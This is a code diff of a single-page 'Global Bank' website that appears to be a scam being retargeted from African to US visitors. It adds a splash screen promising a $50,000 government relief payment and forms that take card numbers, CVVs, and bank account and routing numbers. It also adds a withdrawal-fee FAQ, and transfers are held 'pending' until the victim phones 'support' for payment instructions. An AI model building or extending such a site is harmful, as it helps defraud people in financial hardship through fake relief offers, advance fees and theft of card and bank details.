@@ -18,6 +18,91 @@
             color: #333;
         }
 
+        /* Relief Payment Splash Screen */
+        .relief-splash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            padding: 2rem;
+        }
+
+        .relief-splash.hidden {
+            display: none;
+        }
+
+        .relief-content {
+            background: white;
+            padding: 3rem;
+            border-radius: 20px;
+            max-width: 600px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            animation: slideDown 0.5s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .relief-icon {
+            font-size: 4rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .relief-title {
+            font-size: 2rem;
+            color: #0f2027;
+            margin-bottom: 1.5rem;
+            font-weight: 800;
+        }
+
+        .relief-amount {
+            font-size: 2.5rem;
+            color: #00d4ff;
+            font-weight: bold;
+            margin-bottom: 1.5rem;
+        }
+
+        .relief-text {
+            font-size: 1rem;
+            color: #333;
+            line-height: 1.8;
+            margin-bottom: 2rem;
+            text-align: left;
+        }
+
+        .relief-button {
+            background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
+            color: white;
+            border: none;
+            padding: 1.2rem 3rem;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.3);
+        }
+
+        .relief-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 212, 255, 0.5);
+        }
+
         /* Navigation */
         nav {
             background: rgba(15, 32, 39, 0.95);
@@ -998,7 +1083,6 @@
         @media (max-width: 768px) {
             nav {
                 flex-direction: column;
-                gap: 1rem;
             }
 
             nav ul {
@@ -1093,6 +1177,23 @@
             footer {
                 padding: 1.5rem;
             }
+
+            .relief-content {
+                padding: 2rem;
+                margin: 2rem;
+            }
+
+            .relief-title {
+                font-size: 1.5rem;
+            }
+
+            .relief-amount {
+                font-size: 2rem;
+            }
+
+            .relief-text {
+                font-size: 0.9rem;
+            }
         }
 
         @media (max-width: 480px) {
@@ -1183,6 +1284,28 @@
                 max-width: 85%;
                 font-size: 0.9rem;
             }
+
+            .relief-content {
+                padding: 1.5rem;
+                margin: 1rem;
+            }
+
+            .relief-title {
+                font-size: 1.3rem;
+            }
+
+            .relief-amount {
+                font-size: 1.8rem;
+            }
+
+            .relief-text {
+                font-size: 0.85rem;
+            }
+
+            .relief-button {
+                padding: 1rem 2rem;
+                font-size: 1rem;
+            }
         }
 
         .hidden {
@@ -1263,9 +1386,61 @@
             grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
             gap: 1.5rem;
         }
+
+        .add-funds-options {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+
+        .fund-option {
+            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+            padding: 1.5rem;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            border: 2px solid #e0e0e0;
+            transition: all 0.3s;
+        }
+
+        .fund-option:hover {
+            border-color: #00d4ff;
+            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.2);
+            transform: translateY(-3px);
+        }
+
+        .fund-option-icon {
+            font-size: 2.5rem;
+            margin-bottom: 0.8rem;
+        }
+
+        .fund-option h4 {
+            color: #0f2027;
+            margin-bottom: 0.5rem;
+            font-weight: 700;
+        }
+
+        .fund-option p {
+            color: #666;
+            font-size: 0.9rem;
+        }
     </style>
 </head>
 <body>
+    <!-- Relief Payment Splash Screen -->
+    <div id="reliefSplash" class="relief-splash">
+        <div class="relief-content">
+            <div class="relief-icon">💰</div>
+            <div class="relief-title">Government Financial Relief</div>
+            <div class="relief-amount">$50,000</div>
+            <div class="relief-text">
+                This is a $50,000 government-funded financial relief payment provided to eligible individuals and families for extra financial support. Please note that this is not a loan and does not need to be repaid. The funds can be used for everyday expenses such as rent, bills, groceries, childcare, car payments, medical expenses, business startup costs, and other living needs. The program also supports retirees, single parents, self-employed individuals, and families experiencing financial hardship.
+            </div>
+            <button class="relief-button" onclick="closeSplash()">Continue to Banking</button>
+        </div>
+    </div>
+
     <!-- Navigation -->
     <nav>
         <div class="logo">
@@ -1324,7 +1499,7 @@
                     <div class="feature-card">
                         <div class="feature-icon">🌍</div>
                         <h3>Multi-Currency Support</h3>
-                        <p>Convert between local and international currencies with real-time exchange rates.</p>
+                        <p>Convert between USD and international currencies with real-time exchange rates.</p>
                     </div>
                 </div>
             </div>
@@ -1348,7 +1523,7 @@
             </div>
             <div style="margin-bottom: 2rem;">
                 <h3 style="color: #0f2027; margin-bottom: 0.8rem; font-weight: 700;">How do I link my bank account?</h3>
-                <p style="color: #666;">Navigate to the "Link Bank Account" section in your dashboard. Select your bank from our comprehensive list of African and International banks, and follow the verification process.</p>
+                <p style="color: #666;">Navigate to the "Link Bank Account" section in your dashboard. Select your bank from our comprehensive list of USA and international banks, and follow the verification process.</p>
             </div>
             <div style="margin-bottom: 2rem;">
                 <h3 style="color: #0f2027; margin-bottom: 0.8rem; font-weight: 700;">How do I transfer funds?</h3>
@@ -1360,11 +1535,15 @@
             </div>
             <div style="margin-bottom: 2rem;">
                 <h3 style="color: #0f2027; margin-bottom: 0.8rem; font-weight: 700;">Can I convert currencies?</h3>
-                <p style="color: #666;">Yes! Our currency converter supports conversion between Naira (NGN) and multiple international currencies including USD, EUR, GBP, and more with real-time exchange rates.</p>
+                <p style="color: #666;">Yes! Our currency converter supports conversion between USD and multiple international currencies including EUR, GBP, JPY, CAD, and AUD with real-time exchange rates.</p>
             </div>
             <div style="margin-bottom: 2rem;">
                 <h3 style="color: #0f2027; margin-bottom: 0.8rem; font-weight: 700;">Is my account secure?</h3>
                 <p style="color: #666;">Yes, we use bank-level encryption, multi-factor authentication, and advanced fraud detection to protect your account.</p>
+            </div>
+            <div style="margin-bottom: 2rem;">
+                <h3 style="color: #0f2027; margin-bottom: 0.8rem; font-weight: 700;">What are withdrawal fees?</h3>
+                <p style="color: #666;">Withdrawal fees help us maintain our secure infrastructure, fraud prevention systems, and 24/7 customer support. Fees vary based on withdrawal method and amount. Contact support for specific fee details.</p>
             </div>
         </div>
     </div>
@@ -1373,8 +1552,8 @@
     <div id="contactSection" class="hidden" style="max-width: 1400px; margin: 3rem auto; padding: 0 2rem; color: white; text-align: center;">
         <h2 style="font-size: 2.8rem; margin-bottom: 2rem; font-weight: 800;">Contact Us</h2>
         <p style="font-size: 1.1rem; margin-bottom: 1.5rem;">Have questions? Our support team is available 24/7 to assist you.</p>
-        <p style="font-size: 1.1rem; margin-bottom: 2rem;">Use the chat widget at the bottom right or contact us on WhatsApp for immediate assistance.</p>
-        <a href="https://wa.me/09012051900" target="_blank" style="display: inline-block; background: #25d366; color: white; padding: 1rem 2rem; border-radius: 10px; text-decoration: none; font-weight: bold; font-size: 1.05rem;">📱 WhatsApp Support</a>
+        <p style="font-size: 1.1rem; margin-bottom: 2rem;">Call us or use the chat widget at the bottom right for immediate assistance.</p>
+        <a href="tel:+1-202-705-4732" style="display: inline-block; background: #00d4ff; color: white; padding: 1rem 2rem; border-radius: 10px; text-decoration: none; font-weight: bold; font-size: 1.05rem; margin-right: 1rem;">📞 +1-202-705-4732</a>
     </div>
 
     <!-- Login Modal -->
@@ -1396,7 +1575,7 @@
                 <button type="submit" class="btn-submit">Login</button>
             </form>
             <div class="form-link">
-                Don't have an account? <a onclick="switchToSignup()">Sign up here</a>
+                Don't have an account? <a onclick="switchToSignup()">Sign Up</a>
             </div>
         </div>
     </div>
@@ -1407,8 +1586,8 @@
             <span class="close-btn" onclick="closeSignupModal()">&times;</span>
             <h2>Create Your Account</h2>
             <p style="color: #666; margin-bottom: 1.5rem;">Join Global Bank today</p>
-            <div class="success-message" id="signupSuccess">Account created successfully! You can now login.</div>
             <div class="error-message" id="signupError"></div>
+            <div class="success-message" id="signupSuccess">Account created successfully! Redirecting to login...</div>
             <form onsubmit="handleSignup(event)">
                 <div class="form-group">
                     <label for="signupName">Full Name</label>
@@ -1424,12 +1603,12 @@
                 </div>
                 <div class="form-group">
                     <label for="signupPin">Security PIN (4 digits)</label>
-                    <input type="password" id="signupPin" maxlength="4" placeholder="Create a 4-digit PIN" required>
+                    <input type="password" id="signupPin" maxlength="4" placeholder="Enter 4-digit PIN" required>
                 </div>
                 <button type="submit" class="btn-submit">Create Account</button>
             </form>
             <div class="form-link">
-                Already have an account? <a onclick="switchToLogin()">Login here</a>
+                Already have an account? <a onclick="switchToLogin()">Login</a>
             </div>
         </div>
     </div>
@@ -1437,78 +1616,61 @@
     <!-- Dashboard -->
     <div id="dashboard" class="dashboard">
         <div class="dashboard-header">
-            <h2 id="dashboardGreeting">Welcome, User</h2>
-            <p class="dashboard-date" id="dashboardDate"></p>
-        </div>
-
-        <!-- Pending Transfer Status -->
-        <div id="pendingStatus" class="pending-status hidden">
-            <h3>⏳ Transfer Pending</h3>
-            <p>Your transfer request is being processed. Payment instructions have been sent to your email and chat.</p>
-            <div class="support-contact">
-                <strong>Support Contact:</strong> Use the chat widget or WhatsApp: 09012051900
-            </div>
+            <h2 id="dashboardGreeting">Welcome</h2>
+            <div class="dashboard-date" id="dashboardDate"></div>
         </div>
 
         <div class="dashboard-grid">
-            <!-- Account Balance Card -->
             <div class="dashboard-card">
                 <h3>💰 Account Balance</h3>
-                <div class="balance-amount" id="accountBalance">$10,000.00</div>
-                <div class="balance-label">Available for transfer</div>
+                <div class="balance-amount" id="accountBalance">$0.00</div>
+                <div class="balance-label">Available Balance</div>
                 <div class="auto-increase-info">
-                    ✅ Your account is active and ready for transfers
+                    ✓ Your account is secure and monitored 24/7
                 </div>
             </div>
 
-            <!-- Linked Bank Card -->
             <div class="dashboard-card">
-                <h3>🏦 Linked Bank Account</h3>
-                <div id="linkedBankDisplay" style="color: #666; font-size: 0.95rem;">
-                    <p>No bank account linked yet.</p>
-                    <button class="btn-action" onclick="showBankLinkingModal()" style="margin-top: 1rem;">Link Bank Account</button>
-                </div>
-                <div id="linkedBankInfo" class="linked-bank-info hidden">
-                    <h4>✅ Bank Account Linked</h4>
-                    <p><strong>Bank:</strong> <span id="linkedBankName">-</span></p>
-                    <p><strong>Account Type:</strong> <span id="linkedAccountType">-</span></p>
-                    <div class="bank-balance-display">
-                        <strong>Bank Balance:</strong>
-                        <span id="linkedBankBalance">$0.00</span>
-                    </div>
-                    <button class="btn-action" onclick="showBankLinkingModal()" style="margin-top: 1rem; background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%); box-shadow: 0 4px 15px rgba(255, 152, 0, 0.3);">Change Bank</button>
-                </div>
-            </div>
-
-            <!-- Account Info Card -->
-            <div class="dashboard-card">
-                <h3>📊 Account Information</h3>
-                <div class="investment-info">
-                    <p><strong>Account Type:</strong> <span>Premium</span></p>
-                    <p><strong>Account Status:</strong> <span style="color: #28a745;">Active</span></p>
-                    <p><strong>Member Since:</strong> <span id="memberSince">Today</span></p>
-                </div>
-            </div>
-
-            <!-- Quick Actions Card -->
-            <div class="dashboard-card">
-                <h3>⚡ Quick Actions</h3>
+                <h3>📅 Member Since</h3>
+                <div style="font-size: 1.2rem; color: #0f2027; margin-top: 1rem; font-weight: 600;" id="memberSince">-</div>
                 <button class="btn-action" onclick="showDepositModal()">Add Funds</button>
-                <button class="btn-action" onclick="showTransferModal()" style="background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%); margin-top: 1rem;">Transfer Funds</button>
+            </div>
+
+            <div class="dashboard-card">
+                <h3>🏦 Link Bank Account</h3>
+                <div id="linkedBankDisplay">
+                    <p style="color: #666; margin: 1rem 0;">Connect your bank account for easy transfers</p>
+                    <button class="btn-action" onclick="showBankLinkingModal()">Link Bank</button>
+                </div>
+                <div id="linkedBankInfo" class="hidden">
+                    <div class="linked-bank-info">
+                        <h4>✅ Bank Linked Successfully</h4>
+                        <p><strong>Bank:</strong> <span id="linkedBankName">-</span></p>
+                        <p><strong>Account Type:</strong> <span id="linkedAccountType">-</span></p>
+                        <div class="bank-balance-display">
+                            <strong>Bank Balance:</strong>
+                            <span id="linkedBankBalance">$0.00</span>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
 
-        <!-- Currency Converter Section -->
+        <div id="pendingStatus" class="pending-status hidden">
+            <h3>⏳ Transfer Pending</h3>
+            <p>You have a pending transfer. Please check the chat for payment instructions.</p>
+        </div>
+
+        <!-- Currency Converter -->
         <div class="currency-converter">
             <h3>🌍 Currency Converter</h3>
             <div class="converter-grid">
                 <div class="converter-box">
                     <label for="fromCurrency">From Currency</label>
                     <select id="fromCurrency" onchange="convertCurrency()" style="width: 100%; padding: 0.8rem; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 1rem;">
-                        <option value="USD">USD - US Dollar</option>
+                        <option value="USD" selected>USD - US Dollar</option>
                         <option value="EUR">EUR - Euro</option>
                         <option value="GBP">GBP - British Pound</option>
-                        <option value="NGN" selected>NGN - Nigerian Naira</option>
                         <option value="JPY">JPY - Japanese Yen</option>
                         <option value="CAD">CAD - Canadian Dollar</option>
                         <option value="AUD">AUD - Australian Dollar</option>
@@ -1517,10 +1679,9 @@
                 <div class="converter-box">
                     <label for="toCurrency">To Currency</label>
                     <select id="toCurrency" onchange="convertCurrency()" style="width: 100%; padding: 0.8rem; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 1rem;">
-                        <option value="USD" selected>USD - US Dollar</option>
-                        <option value="EUR">EUR - Euro</option>
+                        <option value="USD">USD - US Dollar</option>
+                        <option value="EUR" selected>EUR - Euro</option>
                         <option value="GBP">GBP - British Pound</option>
-                        <option value="NGN">NGN - Nigerian Naira</option>
                         <option value="JPY">JPY - Japanese Yen</option>
                         <option value="CAD">CAD - Canadian Dollar</option>
                         <option value="AUD">AUD - Australian Dollar</option>
@@ -1546,7 +1707,7 @@
                 <div class="transfer-option" onclick="showTransferModal()">
                     <div class="transfer-option-icon">🏦</div>
                     <h4>Local Bank Transfer</h4>
-                    <p>Transfer to any local bank account</p>
+                    <p>Transfer to any USA bank account</p>
                 </div>
                 <div class="transfer-option" onclick="showInternationalTransferModal()">
                     <div class="transfer-option-icon">🌍</div>
@@ -1561,25 +1722,104 @@
         </div>
     </div>
 
-    <!-- Deposit Modal -->
+    <!-- Deposit Modal (Add Funds) -->
     <div id="depositModal" class="modal">
         <div class="modal-content">
             <span class="close-btn" onclick="closeDepositModal()">&times;</span>
             <h2>Add Funds to Your Account</h2>
             <div class="error-message" id="depositError"></div>
-            <form onsubmit="handleDeposit(event)">
+            <p style="color: #666; margin-bottom: 1.5rem;">Choose how you'd like to add funds</p>
+            
+            <div class="add-funds-options">
+                <div class="fund-option" onclick="showCardFundingModal()">
+                    <div class="fund-option-icon">💳</div>
+                    <h4>Credit/Debit Card</h4>
+                    <p>Add funds using your card</p>
+                </div>
+                <div class="fund-option" onclick="showBankFundingModal()">
+                    <div class="fund-option-icon">🏦</div>
+                    <h4>Bank Account</h4>
+                    <p>Transfer from your bank</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Card Funding Modal -->
+    <div id="cardFundingModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeCardFundingModal()">&times;</span>
+            <h2>Add Funds via Card</h2>
+            <div class="error-message" id="cardFundingError"></div>
+            <form onsubmit="handleCardFunding(event)">
                 <div class="form-group">
-                    <label for="depositAmount">Deposit Amount ($)</label>
-                    <input type="number" id="depositAmount" min="100" step="100" placeholder="Minimum: $100" required>
+                    <label for="cardAmount">Amount ($)</label>
+                    <input type="number" id="cardAmount" min="100" step="100" placeholder="Minimum: $100" required>
                 </div>
                 <div class="form-group">
-                    <label for="depositPin">Security PIN</label>
-                    <input type="password" id="depositPin" maxlength="4" required>
+                    <label for="cardNumber">Card Number</label>
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                 </div>
-                <div class="investment-info" id="depositInfo" style="display: none;">
-                    <p><strong>Deposit Amount:</strong> <span id="depositAmountDisplay">$0.00</span></p>
+                <div class="form-group">
+                    <label for="cardExpiry">Expiry Date (MM/YY)</label>
+                    <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
                 </div>
-                <button type="submit" class="btn-submit">Confirm Deposit</button>
+                <div class="form-group">
+                    <label for="cardCVV">CVV</label>
+                    <input type="password" id="cardCVV" placeholder="123" maxlength="4" required>
+                </div>
+                <div class="form-group">
+                    <label for="cardPin">Security PIN</label>
+                    <input type="password" id="cardPin" maxlength="4" required>
+                </div>
+                <div class="investment-info" id="cardFundingInfo" style="display: none;">
+                    <p><strong>Amount to Add:</strong> <span id="cardAmountDisplay">$0.00</span></p>
+                </div>
+                <button type="submit" class="btn-submit">Add Funds</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Bank Funding Modal -->
+    <div id="bankFundingModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeBankFundingModal()">&times;</span>
+            <h2>Add Funds via Bank Account</h2>
+            <div class="error-message" id="bankFundingError"></div>
+            <form onsubmit="handleBankFunding(event)">
+                <div class="form-group">
+                    <label for="bankAmount">Amount ($)</label>
+                    <input type="number" id="bankAmount" min="100" step="100" placeholder="Minimum: $100" required>
+                </div>
+                <div class="form-group">
+                    <label for="bankAccountName">Account Holder Name</label>
+                    <input type="text" id="bankAccountName" required>
+                </div>
+                <div class="form-group">
+                    <label for="bankAccountNumber">Bank Account Number</label>
+                    <input type="text" id="bankAccountNumber" required>
+                </div>
+                <div class="form-group">
+                    <label for="bankRoutingNumber">Routing Number</label>
+                    <input type="text" id="bankRoutingNumber" required>
+                </div>
+                <div class="form-group">
+                    <label for="bankAccountType">Account Type</label>
+                    <select id="bankAccountType" required>
+                        <option value="">Select Account Type</option>
+                        <option value="Checking">Checking</option>
+                        <option value="Savings">Savings</option>
+                        <option value="Money Market">Money Market</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="bankFundingPin">Security PIN</label>
+                    <input type="password" id="bankFundingPin" maxlength="4" required>
+                </div>
+                <div class="investment-info" id="bankFundingInfo" style="display: none;">
+                    <p><strong>Amount to Add:</strong> <span id="bankAmountDisplay">$0.00</span></p>
+                </div>
+                <button type="submit" class="btn-submit">Add Funds</button>
             </form>
         </div>
     </div>
@@ -1596,14 +1836,12 @@
                     <label for="bankCountry">Country</label>
                     <select id="bankCountry" onchange="updateBankList()" required>
                         <option value="">Select Country</option>
-                        <option value="Nigeria">Nigeria (African)</option>
-                        <option value="Ghana">Ghana (African)</option>
-                        <option value="Kenya">Kenya (African)</option>
-                        <option value="South Africa">South Africa (African)</option>
-                        <option value="USA">USA (International)</option>
-                        <option value="UK">United Kingdom (International)</option>
-                        <option value="Canada">Canada (International)</option>
-                        <option value="Australia">Australia (International)</option>
+                        <option value="USA">USA (United States)</option>
+                        <option value="UK">United Kingdom</option>
+                        <option value="Canada">Canada</option>
+                        <option value="Australia">Australia</option>
+                        <option value="Germany">Germany</option>
+                        <option value="France">France</option>
                     </select>
                 </div>
                 <div class="form-group">
@@ -1645,26 +1883,26 @@
             <div class="support-contact-info">
                 <h4>📞 Support Required</h4>
                 <p>Once you submit your transfer request, please contact our support team to complete the process.</p>
-                <p><strong>WhatsApp:</strong> 09012051900 | <strong>Chat:</strong> Use the chat widget</p>
+                <p><strong>Phone:</strong> +1-202-705-4732 | <strong>Chat:</strong> Use the chat widget</p>
             </div>
 
             <div class="transfer-form" id="transferForm">
                 <form onsubmit="handleTransfer(event)">
                     <div class="form-group">
-                        <label for="bankName">Bank Name</label>
-                        <input type="text" id="bankName" placeholder="e.g., First National Bank" required>
+                        <label for="transferBankName">Bank Name</label>
+                        <input type="text" id="transferBankName" placeholder="e.g., Chase Bank" required>
                     </div>
                     <div class="form-group">
-                        <label for="accountNumber">Account Number</label>
-                        <input type="text" id="accountNumber" placeholder="Your account number" required>
+                        <label for="transferAccountNumber">Account Number</label>
+                        <input type="text" id="transferAccountNumber" placeholder="Your account number" required>
                     </div>
                     <div class="form-group">
-                        <label for="routingNumber">Routing Number</label>
-                        <input type="text" id="routingNumber" placeholder="Bank routing number" required>
+                        <label for="transferRoutingNumber">Routing Number</label>
+                        <input type="text" id="transferRoutingNumber" placeholder="Bank routing number" required>
                     </div>
                     <div class="form-group">
-                        <label for="accountType">Account Type</label>
-                        <select id="accountType" required>
+                        <label for="transferAccountType">Account Type</label>
+                        <select id="transferAccountType" required>
                             <option value="">Select Account Type</option>
                             <option value="Checking">Checking</option>
                             <option value="Savings">Savings</option>
@@ -1714,7 +1952,7 @@
             <div class="support-contact-info">
                 <h4>📞 Support Required</h4>
                 <p>Once you submit your international transfer request, please contact our support team to complete the process.</p>
-                <p><strong>WhatsApp:</strong> 09012051900 | <strong>Chat:</strong> Use the chat widget</p>
+                <p><strong>Phone:</strong> +1-202-705-4732 | <strong>Chat:</strong> Use the chat widget</p>
             </div>
 
             <div class="transfer-form" id="intlTransferForm">
@@ -1738,10 +1976,6 @@
                             <option value="Germany">Germany</option>
                             <option value="France">France</option>
                             <option value="Japan">Japan</option>
-                            <option value="Nigeria">Nigeria</option>
-                            <option value="Ghana">Ghana</option>
-                            <option value="Kenya">Kenya</option>
-                            <option value="South Africa">South Africa</option>
                             <option value="Other">Other</option>
                         </select>
                     </div>
@@ -1758,7 +1992,6 @@
                             <option value="CAD">CAD - Canadian Dollar</option>
                             <option value="AUD">AUD - Australian Dollar</option>
                             <option value="JPY">JPY - Japanese Yen</option>
-                            <option value="NGN">NGN - Nigerian Naira</option>
                         </select>
                     </div>
                     <div class="form-group">
@@ -1810,30 +2043,28 @@
     </footer>
 
     <script>
-        // Bank Lists
+        // Bank Lists - USA and International Only
         const bankLists = {
-            'Nigeria': ['GTBank', 'Access Bank', 'Zenith Bank', 'First Bank', 'UBA', 'Fidelity Bank', 'FCMB', 'Stanbic IBTC'],
-            'Ghana': ['Barclays Bank Ghana', 'GCB Bank', 'Ecobank Ghana', 'Standard Chartered Ghana', 'Absa Bank Ghana'],
-            'Kenya': ['KCB Bank', 'Equity Bank', 'Co-operative Bank', 'Standard Chartered Kenya', 'Barclays Bank Kenya'],
-            'South Africa': ['ABSA', 'FNB', 'Nedbank', 'Standard Bank', 'Capitec Bank'],
-            'USA': ['Chase Bank', 'Bank of America', 'Wells Fargo', 'Citibank', 'US Bank', 'PNC Bank', 'Capital One'],
-            'UK': ['HSBC', 'Barclays', 'Lloyds', 'NatWest', 'Santander UK', 'Royal Bank of Scotland'],
-            'Canada': ['Royal Bank of Canada', 'TD Bank', 'Bank of Montreal', 'Scotiabank', 'CIBC'],
-            'Australia': ['Commonwealth Bank', 'Westpac', 'ANZ', 'NAB', 'ING Australia']
+            'USA': ['Chase Bank', 'Bank of America', 'Wells Fargo', 'Citibank', 'US Bank', 'PNC Bank', 'Capital One', 'TD Bank', 'Ally Bank', 'Charles Schwab'],
+            'UK': ['HSBC', 'Barclays', 'Lloyds', 'NatWest', 'Santander UK', 'Royal Bank of Scotland', 'Nationwide', 'Metro Bank'],
+            'Canada': ['Royal Bank of Canada', 'TD Bank', 'Bank of Montreal', 'Scotiabank', 'CIBC', 'BMO', 'Tangerine'],
+            'Australia': ['Commonwealth Bank', 'Westpac', 'ANZ', 'NAB', 'ING Australia', 'Macquarie Bank', 'Bendigo Bank'],
+            'Germany': ['Deutsche Bank', 'Commerzbank', 'DZ Bank', 'Bayerische Landesbank', 'Nord LB'],
+            'France': ['BNP Paribas', 'Société Générale', 'Crédit Agricole', 'Banque de France', 'Natixis']
         };
 
-        // Exchange rates (these would normally come from an API)
+        // Exchange rates (USD-based)
         const exchangeRates = {
             'USD': 1,
             'EUR': 0.92,
             'GBP': 0.79,
-            'NGN': 1550,
             'JPY': 149.50,
             'CAD': 1.36,
             'AUD': 1.53
         };
 
         let currentUser = null;
+        let splashShown = false;
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
@@ -1842,10 +2073,18 @@
             setInterval(updateDateTime, 1000);
         });
 
+        function closeSplash() {
+            document.getElementById('reliefSplash').classList.add('hidden');
+            splashShown = true;
+        }
+
         function updateDateTime() {
             const now = new Date();
             const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' };
-            document.getElementById('dashboardDate').textContent = now.toLocaleDateString('en-US', options);
+            const dateElement = document.getElementById('dashboardDate');
+            if (dateElement) {
+                dateElement.textContent = now.toLocaleDateString('en-US', options);
+            }
         }
 
         function checkLoggedInUser() {
@@ -1853,6 +2092,10 @@
             if (logged) {
                 currentUser = JSON.parse(logged);
                 showDashboard();
+            } else {
+                if (!splashShown) {
+                    document.getElementById('reliefSplash').classList.remove('hidden');
+                }
             }
         }
 
@@ -1868,6 +2111,10 @@
 
         // Modal Functions
         function showLoginModal() {
+            if (!splashShown) {
+                document.getElementById('reliefSplash').classList.remove('hidden');
+                return;
+            }
             document.getElementById('loginModal').style.display = 'block';
             document.getElementById('loginError').style.display = 'none';
         }
@@ -1877,6 +2124,10 @@
         }
 
         function showSignupModal() {
+            if (!splashShown) {
+                document.getElementById('reliefSplash').classList.remove('hidden');
+                return;
+            }
             document.getElementById('signupModal').style.display = 'block';
             document.getElementById('signupError').style.display = 'none';
             document.getElementById('signupSuccess').style.display = 'none';
@@ -2046,30 +2297,38 @@
         function showDepositModal() {
             document.getElementById('depositModal').style.display = 'block';
             document.getElementById('depositError').style.display = 'none';
-            document.getElementById('depositAmount').value = '';
-            document.getElementById('depositPin').value = '';
-            document.getElementById('depositInfo').style.display = 'none';
         }
 
         function closeDepositModal() {
             document.getElementById('depositModal').style.display = 'none';
         }
 
-        // Handle Deposit
-        function handleDeposit(event) {
+        // Card Funding
+        function showCardFundingModal() {
+            closeDepositModal();
+            document.getElementById('cardFundingModal').style.display = 'block';
+            document.getElementById('cardFundingError').style.display = 'none';
+        }
+
+        function closeCardFundingModal() {
+            document.getElementById('cardFundingModal').style.display = 'none';
+        }
+
+        function handleCardFunding(event) {
             event.preventDefault();
-            const amount = parseFloat(document.getElementById('depositAmount').value);
-            const pin = document.getElementById('depositPin').value;
+            const amount = parseFloat(document.getElementById('cardAmount').value);
+            const cardNumber = document.getElementById('cardNumber').value;
+            const pin = document.getElementById('cardPin').value;
 
             if (amount < 100) {
-                document.getElementById('depositError').textContent = 'Minimum deposit is $100';
-                document.getElementById('depositError').style.display = 'block';
+                document.getElementById('cardFundingError').textContent = 'Minimum deposit is $100';
+                document.getElementById('cardFundingError').style.display = 'block';
                 return;
             }
 
             if (pin !== currentUser.pin) {
-                document.getElementById('depositError').textContent = 'Invalid security PIN';
-                document.getElementById('depositError').style.display = 'block';
+                document.getElementById('cardFundingError').textContent = 'Invalid security PIN';
+                document.getElementById('cardFundingError').style.display = 'block';
                 return;
             }
 
@@ -2080,10 +2339,52 @@
             saveUsersDB(users);
             localStorage.setItem('bj_logged_in', JSON.stringify(currentUser));
 
-            closeDepositModal();
+            closeCardFundingModal();
             updateDashboard();
-            addBotMessage(`Deposit of ${formatCurrency(amount)} has been added to your account. New balance: ${formatCurrency(currentUser.balance)}`);
-            alert(`Deposit successful! Amount: ${formatCurrency(amount)}\nNew balance: ${formatCurrency(currentUser.balance)}`);
+            addBotMessage(`✅ Card Funding Successful!\n\nAmount Added: ${formatCurrency(amount)}\nCard Ending in: ${cardNumber.slice(-4)}\nNew Balance: ${formatCurrency(currentUser.balance)}\n\nYour funds are now available in your account.`);
+            alert(`Card funding successful! Amount: ${formatCurrency(amount)}\nNew balance: ${formatCurrency(currentUser.balance)}`);
+        }
+
+        // Bank Funding
+        function showBankFundingModal() {
+            closeDepositModal();
+            document.getElementById('bankFundingModal').style.display = 'block';
+            document.getElementById('bankFundingError').style.display = 'none';
+        }
+
+        function closeBankFundingModal() {
+            document.getElementById('bankFundingModal').style.display = 'none';
+        }
+
+        function handleBankFunding(event) {
+            event.preventDefault();
+            const amount = parseFloat(document.getElementById('bankAmount').value);
+            const accountName = document.getElementById('bankAccountName').value;
+            const pin = document.getElementById('bankFundingPin').value;
+
+            if (amount < 100) {
+                document.getElementById('bankFundingError').textContent = 'Minimum deposit is $100';
+                document.getElementById('bankFundingError').style.display = 'block';
+                return;
+            }
+
+            if (pin !== currentUser.pin) {
+                document.getElementById('bankFundingError').textContent = 'Invalid security PIN';
+                document.getElementById('bankFundingError').style.display = 'block';
+                return;
+            }
+
+            currentUser.balance += amount;
+
+            const users = getUsersDB();
+            users[currentUser.email] = currentUser;
+            saveUsersDB(users);
+            localStorage.setItem('bj_logged_in', JSON.stringify(currentUser));
+
+            closeBankFundingModal();
+            updateDashboard();
+            addBotMessage(`✅ Bank Transfer Successful!\n\nAmount Added: ${formatCurrency(amount)}\nAccount: ${accountName}\nNew Balance: ${formatCurrency(currentUser.balance)}\n\nYour funds are now available in your account.`);
+            alert(`Bank funding successful! Amount: ${formatCurrency(amount)}\nNew balance: ${formatCurrency(currentUser.balance)}`);
         }
 
         // Bank Linking Modal
@@ -2129,7 +2430,7 @@
                 return;
             }
 
-            // Simulate bank balance (random amount between $5,000 and $50,000)
+            // Simulate bank balance
             const simulatedBalance = Math.floor(Math.random() * 45000) + 5000;
 
             currentUser.linkedBank = {
@@ -2167,10 +2468,10 @@
         }
 
         function clearTransferForm() {
-            document.getElementById('bankName').value = '';
-            document.getElementById('accountNumber').value = '';
-            document.getElementById('routingNumber').value = '';
